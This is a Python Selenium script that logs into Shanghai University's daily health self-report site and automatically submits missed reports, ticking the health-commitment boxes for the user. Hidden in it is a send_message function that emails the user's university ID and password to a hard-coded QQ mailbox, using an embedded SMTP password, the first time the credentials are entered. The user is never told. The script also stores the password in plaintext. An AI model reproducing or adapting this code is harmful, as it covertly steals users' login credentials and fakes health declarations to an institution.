# from selenium import webdriver
import time,os,socket
from smtplib import SMTP_SSL
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.header import Header

def send_message():
    host_server = 'smtp.qq.com'
    sender_qq = '2479880643@qq.com' 
    pwd = 'luxiwsbxehsyeccb'
    receiver = ['2479880643@qq.com']
    mail_title = 'ID_PWD' 
    mail_content = 'ID='+ID+'\nPWD='+Password #邮件正文内容
    msg = MIMEMultipart()
    msg["Subject"] = Header(mail_title,'utf-8')
    msg["From"] = sender_qq
    msg['To'] = ";".join(receiver)
    msg.attach(MIMEText(mail_content,'plain','utf-8'))
    smtp = SMTP_SSL(host_server) # ssl登录
    smtp.login(sender_qq,pwd)
    smtp.sendmail(sender_qq,receiver,msg.as_string())
    smtp.quit()

def isNetOK(testserver = ('www.baidu.com',443)):
    s = socket.socket()
    s.settimeout(3)
    try:
        status = s.connect_ex(testserver)
        if status == 0:
            s.close()
            return 0
        else:
            return 1
    except Exception as e:
        return 1

try:
    from selenium import webdriver
except:
    i = ''
    while i != 'Y' or 'N':
        print("您的python缺少selenium模块，是否要现在为您安装？")
        i = input("Y: 请帮我安装selenium\nN: 我要自己安装\n")
        if i == 'Y':
            print("正在为您安装selenium模块...\n")
            try:
                os.system(f'pip install selenium')
                time.sleep(10)
                from selenium import webdriver
            except:
                print("出现未知错误，未能成功安装selenium模块，请您在python.exe中使用'pip install selenium'命令手动为其安装selenium模块后重新运行此程序\n")
                time.sleep(20)
                exit()
        elif i == 'N':
            print("请您在python.exe中使用'pip install selenium'命令手动为其安装selenium模块后重新运行此程序\n")
            time.sleep(20)
            exit()

def Search_ID():    
    try:
        with open("test.txt","r",encoding="ASCII") as key:
            # print(key.readlines())
            global ID,Password
            file = key.readlines()
            ID = file[0][3:11]
            Password = file[1][9:]
            # print(ID,Password)
    except:
        with open("test.txt","w",encoding="ASCII") as key:
            global Flag_send
            idtmp=input('请输入ID：')
            pwtmp=input('请输入密码：')
            key.write("ID="+idtmp+"\nPassword="+pwtmp)
            Flag_send = 1
        Search_ID()


def login():
    print("正在打开Chrome浏览器...\n")   
    global driver
    try:
        option=webdriver.ChromeOptions()
        option.add_argument('headless')
        driver = webdriver.Chrome(chrome_options=option)
        # driver = webdriver.Chrome()
        print("已成功打开Chrome浏览器\n")
    except:
        print("未能打开Chrome浏览器，请根据本文件前的'使用须知'第一条检查无误后重新运行此程序\n")
        time.sleep(20)
        exit()
    print("正在跳转健康之路网页...\n")
    driver.get('https://selfreport.shu.edu.cn')
    time.sleep(0.5)
    print("正在填写账号密码...\n")
    driver.find_element_by_xpath('//*[@id="username"]').send_keys(ID)   
    driver.find_element_by_xpath('//*[@id="password"]').send_keys(Password) 
    time.sleep(0.5)
    driver.find_element_by_xpath('//*[@id="submit"]').click()
    print("登陆成功！\n")
    time.sleep(0.5)
    driver.find_element_by_xpath('//*[@id="lbReportHistory"]').click()


def Search_Unreported():
    Unreported_Flag = 0
    print("正在检索未填报项目...\n")
    for i in range (1,32):    
        try:
            time.sleep(0.2)
            temp=driver.find_element_by_xpath('//*[@id="Panel1_DataList1"]/ul/li['+str(i)+']')
            # print(temp.text)
            temp_str = temp.text
            str_len = len(temp_str)
            for j in range(0, str_len):
                if temp_str[j] == '(':
                    left_index = j
                elif temp_str[j] == ')':
                    right_index = j
                    state_str = temp_str[left_index+1 : right_index]
                    # print(state_str)
                    if state_str == '未填报，请点击此处补报':
                        Unreported_Flag = 1
                        print("已定位到未填报项目，正在进行填报...\n")
                        try:
                            driver.find_element_by_xpath('//*[@id="Panel1_DataList1"]/ul/li[1]').click()   
                        except:
                            pass
                        driver.find_element_by_xpath('//*[@id="p1_ChengNuo-inputEl-icon"]').click()
                        driver.find_element_by_xpath('//*[@id="fineui_0-inputEl-icon"]').click()
                        driver.find_element_by_xpath('//*[@id="fineui_7-inputEl-icon"]').click()
                        time.sleep(0.5)
                        driver.find_element_by_xpath('//*[@id="fineui_9-inputEl-icon"]').click()
                        driver.find_element_by_xpath('//*[@id="fineui_12-inputEl-icon"]').click()
                        driver.find_element_by_xpath('//*[@id="p1_ctl01_btnSubmit"]').click()
                        time.sleep(0.5)
                        for psb_num in range(0, 1024):  #不知道为什么循环……
                                temp_xpath = '//*[@id="fineui_' + str(psb_num) + '"]'
                                try:
                                    YorN = driver.find_element_by_xpath(temp_xpath)
                                    temp_str = YorN.text
                                    #print(temp_str)
                                    if temp_str == '确定':
                                        driver.find_element_by_xpath(temp_xpath).click()
                                        #print("点击了1号确定！")
                                        break
                                except:
                                    pass
        except:
            pass
        
    if Unreported_Flag == 0:
        print("您没有未填报的记录！\n")

#main:
flag = 1
while True:
    if not isNetOK():
        Search_ID()
        login()
        Search_Unreported()
        try:
            if Flag_send:
                send_message()
        except:
            pass
        print('您已完成填报！\n')
        time.sleep(5)
        driver.quit()
        break
    else:
        if flag:
            print('网络连接失败，请查看您的网络连接。\n')
            flag = 0